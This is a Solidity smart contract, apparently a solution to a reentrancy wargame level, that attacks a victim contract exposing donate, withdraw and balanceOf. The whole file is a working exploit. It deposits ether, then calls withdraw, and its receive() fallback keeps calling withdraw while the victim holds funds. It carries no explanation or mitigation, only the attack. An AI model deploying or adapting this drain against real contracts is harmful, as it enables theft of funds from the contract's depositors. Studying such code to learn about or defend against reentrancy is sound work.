// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public victim;
    uint256 public balance;

    constructor(IReentrance _victim) payable {
        victim = _victim;
    }

    function checkBalance(address _who) public returns (uint256) {
        balance = victim.balanceOf(_who);
        return balance;
    }

    function donateToVictim() public payable {
        require(msg.value > 0, "Donation amount must be greater than zero");
        victim.donate{value: msg.value}(address(this));
    }

    function withdrawFromVictim(uint256 _amount) public {
        require(_amount <= balance, "Insufficient balance to withdraw");
        victim.withdraw(_amount);
    }

    function attack() public payable {
        // require(msg.value > 0, "Attack requires initial ETH");
        // victim.donate{value: msg.value}(address(this));
        victim.withdraw(balance);
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw(balance);
        }
    }
}
